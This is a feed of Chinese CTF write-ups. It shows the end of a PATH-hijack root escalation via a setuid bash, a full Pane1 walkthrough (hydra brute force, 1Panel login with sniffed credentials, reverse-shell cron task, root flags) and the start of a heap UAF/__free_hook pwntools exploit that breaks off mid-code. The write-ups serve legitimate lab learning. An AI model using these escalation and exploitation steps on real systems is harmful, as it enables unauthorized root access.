<p>看到它用 system 函数执行了 <em>dest</em> 这个字符串变量，<em>dest</em> 里面又是包含 <code>timedatectl | grep &#39;Local time&#39; | awk -F&#39;: &#39; &#39;</code> 这个命令，其中的 <code>timedatectl</code> 没有使用绝对路径，且程序里面没有初始化 <strong>PATH</strong> 环境变量，因此我们可以尝试进行命令劫持。</p>
<p>在家目录下创建一个 <code>timedatectl</code> 文件，里面包含我们想要的提权命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ <span class="built_in">echo</span> <span class="string">&#x27;chmod +s /bin/bash&#x27;</span> &gt;timedatectl</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;chmod +s /bin/bash&#x27;</span> &gt;timedatectl</span><br><span class="line">kyoma@Mayuri:~$ <span class="built_in">chmod</span> +x timedatectl</span><br><span class="line"><span class="built_in">chmod</span> +x timedatectl</span><br><span class="line">kyoma@Mayuri:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">a.out  Mail  timedatectl  TimeMachine  user.txt</span><br><span class="line">kyoma@Mayuri:~$ </span><br></pre></td></tr></table></figure>

<p>修改 <strong>PATH</strong> :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ <span class="built_in">export</span> PATH=/home/kyoma:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=/home/kyoma:<span class="variable">$PATH</span></span><br><span class="line">kyoma@Mayuri:~$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/home/kyoma:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">kyoma@Mayuri:~$</span><br></pre></td></tr></table></figure>

<p>这时候如果运行TimeMachine，它使用的 <strong>timedatectl</strong> 命令应该就是我们放在家目录的那一个：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ ./TimeMachine</span><br><span class="line">./TimeMachine</span><br><span class="line">==================================================</span><br><span class="line">=   世界线观测仪 v3.14 - AMADEUS 系统   =</span><br><span class="line">=      版权所有 2011, 未来道具研究所         =</span><br><span class="line">==================================================</span><br><span class="line"></span><br><span class="line">[系统] 初始化... 正在访问时序子系统。</span><br><span class="line">[自检] 验证命运石之眼校准... 正常。</span><br><span class="line">[自检] SERN 网络接口... 已激活。监视中...</span><br><span class="line"></span><br><span class="line">[警告] 时间跳跃机使用前需要充能。</span><br><span class="line">电话微波炉(暂定)充能中 [###################################] 100% (距离充能完毕:    0ms)</span><br><span class="line"></span><br><span class="line">[成功] 充能完毕。系统准备就绪。</span><br><span class="line"></span><br><span class="line">[成功] 正在向 IBN 5100 传输时序查询...</span><br><span class="line">--------------------------------------------------</span><br><span class="line">--------------------------------------------------</span><br><span class="line"></span><br><span class="line">操作完成。这一切都是命运石之门的选择。</span><br><span class="line">El. Psy. Kongroo.</span><br><span class="line">kyoma@Mayuri:~$ </span><br></pre></td></tr></table></figure>

<p>查看 <strong>&#x2F;bin&#x2F;bash</strong> 的权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ <span class="built_in">ls</span> -liah /bin/bash</span><br><span class="line"><span class="built_in">ls</span> -liah /bin/bash</span><br><span class="line">263242 -rwsr-sr-x 1 root root 1.2M Apr 18  2019 /bin/bash</span><br><span class="line">kyoma@Mayuri:~$ </span><br></pre></td></tr></table></figure>

<p>可以看到已经有了s权限，用 <code>/bin/bash -p</code> 提权：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ /bin/bash -p</span><br><span class="line">/bin/bash -p</span><br><span class="line">bash-5.0# <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">bash-5.0# </span><br></pre></td></tr></table></figure>

<p>root flag：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash-5.0# <span class="built_in">cat</span> /root/root.txt</span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br><span class="line">flag&#123;1.123581%&#125;</span><br><span class="line">bash-5.0# </span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Maze-Sec</tag>
        <tag>cypher</tag>
      </tags>
  </entry>
  <entry>
    <title>MazeSec-Pane1</title>
    <url>/2025/08/13/MazeSec-Pane1/</url>
    <content><![CDATA[<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/pane1]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -p- 192.168.0.106 -oA ports</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-13 09:55 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.106</span><br><span class="line">Host is up (0.00041s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">38415/tcp open  unknown</span><br><span class="line">MAC Address: 66:14:A6:1C:F8:E8 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.92 seconds</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/pane1]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -sT -sC -sV -O -p22,80,38415 192.168.0.106 -oA details</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-13 09:57 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.106</span><br><span class="line">Host is up (0.0023s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)</span><br><span class="line">|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)</span><br><span class="line">|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.62 ((Debian))</span><br><span class="line">|_http-title: \xE8\xBF\x90\xE7\xBB\xB4\xE7\xAE\xA1\xE7\x90\x86\xE9\x9D\xA2\xE6\x9D\xBF</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">|_http-server-header: Apache/2.4.62 (Debian)</span><br><span class="line">38415/tcp open  http    Golang net/http server</span><br><span class="line">|_http-title: \xE6\x9A\x82\xE6\x97\xB6\xE6\x97\xA0\xE6\xB3\x95\xE8\xAE\xBF\xE9\x97\xAE</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest, HTTPOptions: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Set-Cookie: panel_public_key=LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE1ZllUUXFaT05WV3h5YlpqSndZbwp4Y1VuYnkyVUFZVVg4K0tBZmpna1liTVN2SU5ma1N4a3ZPMGIvNURud0F4UG9lYUZMTHNCTHhpOG9rVmdwRkQ4CjQ1U3R1Mmlqa1lXRVBXM29jWnEwVDMxODcremk0aTBxYlpvZU9pRWVzRUNCQksxTHhSeGowV1E4bnZSMTRnbk8KYktmRzEwL01xR040Nk9TL09XU0RkeXZxWXA0OGttRElaVlQxMCsxWGNzNXBEMnltUUxsWUl0L0VEQVEyQ0wwRQpzR1BKOUoreHJsSGVQMnl1cTgrQ2hlNmFWWWhmOE5oYmZzdVRQTW9TLy9DQVZTN0ZISmw5ZDA2aE5zbXhDV2pOCmJrL01VYnVMWUlmZk9jTWxmaW90eWNqL1VmNDJTQWZCVWZHTG5Na2ZKcVprbmhsV3V3Q2NINUVJZ29wMWl6T1YKelFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg%3D%3D; Path=/; Max-Age=604800</span><br><span class="line">|     Date: Wed, 13 Aug 2025 01:57:26 GMT</span><br><span class="line">|     Content-Length: 1410</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">|     &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">|     &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">|_    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-w</span></span><br><span class="line"><span class="string">MAC Address: 66:14:A6:1C:F8:E8 (Unknown)</span></span><br><span class="line"><span class="string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span></span><br><span class="line"><span class="string">Device type: general purpose|router</span></span><br><span class="line"><span class="string">Running: Linux 4.X|5.X, MikroTik RouterOS 7.X</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span></span><br><span class="line"><span class="string">OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span></span><br><span class="line"><span class="string">Network Distance: 1 hop</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 29.89 seconds</span></span><br></pre></td></tr></table></figure>
<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>80 端口和 38415 看上去都是web，而且 38415 端口有一个比较有特征的 <strong>panel_public_key</strong>，搜了一下 <strong>panel</strong>，发现有关的为 <strong>1panel</strong> 这个运维面板，可能后面会有用。</p>
<p>先看看 80 端口：</p>
<p><img src="image1.webp" alt="image1"></p>
<p>是个登录的页面，试了几个弱密码，都无法登录。</p>
<p>那就进行目录扫描：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/pane1]</span><br><span class="line">└─$ <span class="built_in">sudo</span> gobuster <span class="built_in">dir</span>  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u http://192.168.0.106 -x php,html,txt  </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.0.106</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,html,txt</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.html                (Status: 403) [Size: 278]</span><br><span class="line">/.php                 (Status: 403) [Size: 278]</span><br><span class="line">/index.php            (Status: 200) [Size: 2016]</span><br><span class="line">/logout.php           (Status: 302) [Size: 0] [--&gt; index.php]</span><br><span class="line">/dashboard.php        (Status: 302) [Size: 0] [--&gt; index.php]</span><br><span class="line">/.php                 (Status: 403) [Size: 278]</span><br><span class="line">/.html                (Status: 403) [Size: 278]</span><br><span class="line">/server-status        (Status: 403) [Size: 278]</span><br><span class="line">Progress: 830572 / 830576 (100.00%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<p>没什么信息。</p>
<p>放一个 <strong>hydra</strong> 爆破密码在后台:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/pane1]</span><br><span class="line">└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -vV -t 4 192.168.0.106 http-post-form <span class="string">&#x27;/:username=^USER^&amp;password=^PASS^:Something Error.&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后我们先看看 38415 端口的web：</p>
<p><img src="image2.webp" alt="image2"></p>
<p>说是暂时无法访问，目录扫描看看：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/pane1]</span><br><span class="line">└─$ dirsearch -u http://192.168.0.106:38415</span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                   </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                                                            </span><br><span class="line">                                                                                                                                                                                   </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/HMV/pane1/reports/http_192.168.0.106_38415/_25-08-13_10-16-39.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.0.106:38415/</span><br><span class="line"></span><br><span class="line">[10:16:39] Starting:                                                                                                                                                               </span><br><span class="line">[10:17:01] 404 -   43B  - /assets/file                                      </span><br><span class="line">[10:17:01] 200 -  257B  - /assets/                                          </span><br><span class="line">[10:17:01] 301 -   43B  - /assets  -&gt;  /assets/</span><br><span class="line">[10:17:01] 404 -   43B  - /assets/fckeditor</span><br><span class="line">[10:17:01] 404 -   43B  - /assets/pubspec.yaml                              </span><br><span class="line">[10:17:01] 404 -   43B  - /assets/npm-debug.log</span><br><span class="line">[10:17:01] 404 -   43B  - /assets/js/fckeditor                              </span><br><span class="line">[10:17:11] 301 -   48B  - /favicon.ico  -&gt;  /favicon.ico/                   </span><br><span class="line">[10:17:13] 200 -    4B  - /health                                           </span><br><span class="line">[10:17:27] 301 -   43B  - /public  -&gt;  /public/                             </span><br><span class="line">[10:17:27] 200 -  117B  - /public/</span><br></pre></td></tr></table></figure>

<p>通过这些目录里的信息，确定后台是一个 <strong>1panel</strong> 的运维面板。</p>
<p>网上搜搜 <strong>1panel漏洞</strong> ，发现了一个 <strong>CVE-2025-54424</strong> 比较新，但是这个漏洞需要进行ssl连接，使用给出的 poc 发现总是连接失败，想必不是。</p>
<p>之后又搜了一下 <strong>1panel 默认用户名密码</strong>，但是也没有搜到什么有用的信息。</p>
<p>到这里，我感觉入口应该就是前面的那个登录页面，可能我的思路哪里有问题，准备再从 80 端口的登录页面入手。</p>
<p>前面 hydra 爆破 admin 的密码没有爆破出来，这次，我采用 hydra 循环用户名来进行爆破：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/pane1]</span><br><span class="line">└─$ hydra -L /usr/share/wordlists/fuzzDicts/userNameDict/top500.txt -P /usr/share/wordlists/rockyou.txt -vV -t 4 192.168.0.106 http-post-form <span class="string">&#x27;/:username=^USER^&amp;password=^PASS^:Something Error.&#x27;</span> -u -I</span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-13 11:19:03</span><br><span class="line">[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 7344332288 login tries (l:512/p:14344399), ~1836083072 tries per task</span><br><span class="line">[DATA] attacking http-post-form://192.168.0.106:80/:username=^USER^&amp;password=^PASS^:Something Error.</span><br><span class="line">[VERBOSE] Resolving addresses ... [VERBOSE] resolving <span class="keyword">done</span></span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;admin&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 1 of 7344332288 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;test&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 2 of 7344332288 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;test01&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 3 of 7344332288 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;test1&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 4 of 7344332288 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;test2&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 5 of 7344332288 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;weblogic&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 6 of 7344332288 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;ftp&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 7 of 7344332288 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;manager&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 8 of 7344332288 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;manage&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 9 of 7344332288 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;user&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 10 of 7344332288 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;guest&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 11 of 7344332288 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;administrator&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 12 of 7344332288 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;account&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 13 of 7344332288 [child 1] (0/0)</span><br><span class="line">[VERBOSE] Page redirected to http[s]://192.168.0.106:80/dashboard.php</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;super&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 14 of 7344332288 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.0.106 - login <span class="string">&quot;superuser&quot;</span> - pass <span class="string">&quot;123456&quot;</span> - 15 of 7344332288 [child 2] (0/0)</span><br><span class="line">[80][http-post-form] host: 192.168.0.106   login: administrator   password: 123456</span><br></pre></td></tr></table></figure>

<p>发现了一个有效凭据 <code>administrator:123456</code> ，原来用户名不是 admin，而是administrator。。。</p>
<p>那就用这个用户名密码登录：</p>
<p><img src="image3.webp" alt="image3"></p>
<p>进去之后发现有个流量包，下载下来，拿wireshark看一下，发现里面有几条用用户名密码登录的数据：</p>
<p><img src="image4.webp" alt="image4"></p>
<p>登录的目的网站就是我们所在的这个网站，因此我又尝试了重新用这些凭据去登录，但是都没法登录（我以为用这些凭据登录之后会有不一样的功能……）。</p>
<p>然后仔细看看我前面登录后的页面，发现在 <strong>“服务状态”</strong> 这里，有个 <strong>1Panel 122b059247</strong> :</p>
<p><img src="image5.webp" alt="image5"></p>
<p>想到前面 38415 端口说会有个安全登录的入口，想必这个 <strong>122b059247</strong> 就是那个路径，去访问一下：</p>
<p><img src="image6.webp" alt="image6"></p>
<p>是个 1Panel 的登录页面，尝试用前面数据包里发现的用户名密码去登录，发现 <code>root:superpassword123</code> 可以登录进去：</p>
<p><img src="image7.webp" alt="image7.png"></p>
<p>然后发现可以添加计划任务，添加一个反弹shell的计划任务：</p>
<p><img src="image8.webp" alt="image8"></p>
<h2 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h2><p>执行之后，shell 就弹回来了，发现直接就是 root：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/pane1]</span><br><span class="line">└─$ nc -nvlp 1234</span><br><span class="line">Listening on 0.0.0.0 1234</span><br><span class="line">Connection received on 192.168.0.106 54328</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">root@Pane1:/opt/1panel/task/shell/test# <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">root@Pane1:/opt/1panel/task/shell/test#</span><br></pre></td></tr></table></figure>

<p>拿 user flag 和 root flag：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Pane1:/home/kaada# <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">flag&#123;user-ef68ba312de0daa3dd200a3f9275a6f6&#125;</span><br><span class="line">root@Pane1:/home/kaada# <span class="built_in">cat</span> /root/root.txt</span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br><span class="line">flag&#123;root-e07910a06a086c83ba41827aa00b26ed&#125;</span><br><span class="line">root@Pane1:/home/kaada# </span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Maze-Sec</tag>
        <tag>1Panle</tag>
      </tags>
  </entry>
  <entry>
    <title>NewStarCTF-Note</title>
    <url>/2025/10/29/NewStarCTF-Note/</url>
    <content><![CDATA[<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>这是一道pwn题，题目描述说是从这里开始学习堆的利用，应该是一道比较入门的堆题。</p>
<p>IDA 查看一下源码，是一个比较经典的 <strong>记笔记</strong> 的题目，就是有 <strong>“增、删、改、查”</strong> 四个功能的笔记系统：</p>
<p><img src="image1.webp" alt="image1"></p>
<p>可以记多个笔记，题目用一个 <em>chunk_list</em> 记录了这些笔记的节点，用 <strong>malloc</strong> 来创建笔记节点的空间：</p>
<p><img src="image2.webp" alt="image2"></p>
<p>漏洞出在 <strong>Release</strong> 这个功能里，里面会对笔记进行删除，也就是会 <strong>free</strong> 掉笔记节点空间。但是它 free 之后，没有置 <em>chunk_list</em> 对应的指针为空指针，这就会导致 <strong>Use After Free(UAF)</strong> 漏洞，即该节点被 free 之后，我们仍然能够访问到它。</p>
<p><img src="image3.webp" alt="image3"></p>
<p>同时，在查看笔记的功能里，它也是直接利用 <em>chunk_list</em> 来访问并输出的，意味着我们可以直接查看该 <strong>chunk</strong> 里的内容来获取一些信息。</p>
<p><img src="image4.webp" alt="image4"></p>
<p>被 free 掉的chunk，里面会有 <strong>fd</strong> 指针和 <strong>bk</strong> 指针，用来指向同一个链表中的 <strong>下一个</strong> 和 <strong>上一个</strong> chunk。因此，<strong>fd</strong> 和 <strong>bk</strong> 通常被用来泄漏程序上下文的一些信息。</p>
<p><strong>checksec</strong> 检查程序发现，该程序保护全开，意味着我们需要泄漏 <strong>libc</strong> 才能继续后面的漏洞利用。</p>
<p>我询问了 DeepSeek 来试图获得泄漏 libc 的方法。他说：<strong>“当chunk被free并放入unsorted bin时，其fd和bk指针会指向main_arena内部的地址，而main_arena位于libc数据段中。”</strong> 所以，我们可以让一个 chunk 先进入 <strong>unsorted bin</strong> ，然后通过查看该 chunk 的信息来获取 fd 的值（因为原本放 user data 的地方现在放的是 fd，因此程序的查看功能能让我们直接看到 fd 的值）。</p>
<p>因此，我需要创建一个大于 <strong>fast bin</strong> 的 chunk，好让他进入 <strong>unsorted bin</strong>，DeepSeek 推荐为 <strong>0x430</strong> 这个大小。</p>
<p>同时，我还需要在这个大的 chunk 后面再创建一个小的 chunk ，这样让大的 chunk 与 <strong>top chunk</strong> 分开，就不会被合并到 <strong>top chunk</strong> 里了。</p>
<p>因此，我们要做的操作是这样的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add(0,0x440)  #在 0 索引处添加 0x440 大小的 chunk</span><br><span class="line">add(1,0x10)</span><br><span class="line">release(0)  # 释放 0 索引的 chunk</span><br><span class="line">puts(0)  #利用 UAF 漏洞，查看 0 索引处的 chunk 的值（fd 值）</span><br></pre></td></tr></table></figure>

<p>这样操作完了之后，我拿到了一个值： <code>0x7ffff7dcdca0</code>，根据 DeepSeek 说的，这应该是 <strong>main_arena</strong> 的地址。</p>
<p>但是我在网上搜索，找到了<a href="https://0bs3rver.space/2020/11/02/pwnable-tw-hacknote-%E7%94%A8main-arena%E6%B3%84%E6%BC%8Flibc/#unsortbin%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80">这篇博客</a>，里面说 <strong>“可以通过在IDA中观察对应libc的malloc_trim()函数f5后的结果即可获得main_arena距离libc的起始偏移”</strong> 。</p>
<p><img src="image5.webp" alt="image5"></p>
<p>我用这个方法找到题目给的 libc 里面的 main_arena 的偏移为 <strong>0x3ebc40</strong> ，这也是 DeepSeek 说的值：</p>
<p><img src="image6.webp" alt="image6"></p>
<p>题目给的 libc 刚好就是 2.27 的。同时 DeepSeek 也说 <strong>main_arena</strong> 一般位于 <strong>__malloc_hook + 0x10</strong> 的位置。 </p>
<p>但我拿到的 fd 的值的结尾是 <code>ca0</code> ，并不是 <code>c40</code> ，其中相差了 <strong>0x60</strong> 的偏移。通过看博客和问 AI 的方式，我也是了解到，<strong>0x60</strong> 应该是这个 libc 中，unsorted bin 头与 main_arena 的偏移。</p>
<p>于是 main_arena 的地址就可以拿到了，fd - 0x60 &#x3D; main_arena ，再根据 main_arena 在 libc 中的偏移就可以确定 libc 的基地址了。</p>
<p>有了 libc 的基地址，我们要进一步考虑怎么获得 shell。</p>
<p>通过学习了解到，比较常用的方法是 <strong>劫持 <code>__free_hook</code> 为 <code>system</code> ，然后 free 一个含有 <code>/bin/sh</code> 字符串的 chunk ，这样就可以执行 <code>system(&quot;/bin/sh&quot;)</code> 了。</strong></p>
<p><code>__free_hook</code> 是一个可写的函数指针，如果 free 之前，<code>__free_hook</code> 被写入了一个地址，那就会先去这个地址执行该地址所在的函数。</p>
<p>因此如果我们修改了 <code>__free_hook</code> 上的地址为 <code>system</code> 的地址，调用 <code>free</code> 的时候就会优先调用 <code>system</code> 了。</p>
<p>题中的 <strong>“改”</strong> 的操作，可以直接对 chunk 里的内容进行更改。配合 UAF 漏洞，我们可以在一个 chunk 在 <strong>tcache bin</strong> 时，就修改它的 fd 指针（原本是用来修改 <strong>user data</strong> 的部分，已经被 free 了，所以那个位置是 fd）为 <code>__free_hook</code> 的地址，再连续申请两次相同大小的空间，第一次获得正常的在 <strong>tcache bin</strong> 中的 chunk，第二次就可以获得 <code>__free_hook</code> 所在的空间了。接着就可以往 <code>__free_hook</code> 的地址写入 <code>system</code> 的地址，再 free 一个 <strong>&#x2F;bin&#x2F;sh</strong> 字符串所在的 chunk ，就可以 get shell 了。</p>
<p>这里也有一个坑，我在询问 AI ，fd 指的是 chunk 的头还是 user data 部分的时候， AI 说 fd 会指向 chunk 的头，也就是 <strong>user data - 0x10</strong> 的位置，但我实际用 GDB 调试发现，<strong>tcache 中的 fd 指针会指向 <code>user data</code> 的部分，而不是 chunk 头。</strong></p>
<p>以下为 exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;./pwn_patched&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;./ld-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn_patched&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;39.106.48.123&#x27;</span>,<span class="number">43714</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">rv = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span 